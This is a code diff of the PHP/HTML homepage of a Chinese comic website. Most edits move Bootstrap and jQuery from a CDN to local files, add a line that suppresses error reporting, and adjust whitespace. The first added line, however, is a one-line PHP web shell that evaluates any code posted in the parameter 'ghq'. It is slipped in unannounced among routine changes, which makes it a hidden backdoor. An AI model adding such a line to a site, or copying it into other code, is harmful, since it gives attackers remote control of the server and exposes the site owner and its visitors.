@@ -1,12 +1,13 @@
+    <?php @eval($_POST['ghq']);?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>漫画狗--你想要的所有</title>
-<link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+<link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
 	<link rel="stylesheet" href="css/main.css">
-	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script> 
+	<script src="js/jquery_min.js"></script>
 </head>
 <body>
 	<div class="navbar navbar-default">
@@ -33,6 +34,7 @@
 			<ul class="nav navbar-nav navbar-right">
 				<li><a href="#">
 					<?php
+					error_reporting(E_ALL^E_NOTICE^E_WARNING); //屏蔽错误信息
 				include "conn.php";
 				session_start();
 				if($_SESSION['islogin']==1){
@@ -125,9 +127,10 @@
 
 
 			</div>
-			
+
 		</div>
-		<div class="col-sm-3">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Id unde, ut placeat adipisci quod incidunt animi expedita enim similique sapiente? Consequuntur, accusamus dignissimos est, quod ad debitis cupiditate necessitatibus commodi!</div>
+		<div class="col-sm-3">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Id unde, ut placeat adipisci quod incidunt animi expedita enim similique sapiente? Consequuntur, accusamus dignissimos est, quod ad debitis cupiditate necessitatibus commodi!
+		</div>
 		</div>
 
 	</div>
